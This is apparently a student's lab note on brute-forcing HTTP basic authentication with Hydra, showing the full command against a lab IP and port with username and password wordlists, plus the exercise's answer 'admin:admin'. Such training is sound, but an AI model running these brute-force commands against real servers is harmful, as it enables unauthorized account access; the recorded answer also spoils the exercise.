# Username Brute Force

We can also use Hydra to attack HTTP basic auth by using separate wordlists of usernames and passwords.

For this we will use two wordlists [rock you](./wordlists/rockyou.txt) and [names](./wordlists/names.txt)


The command used is:
```
hydra -L names.txt -P rockyou.txt -u -f 46.101.23.188 -s 31294 http-get /

```

# Question
```
Try running the same exercise on the question from the previous section, to learn how to brute force for users.

Command:
hydra -L names.txt -P rockyou.txt -u -f 46.101.23.188 -s 31294 http-get /

Answer:

admin:admin

```
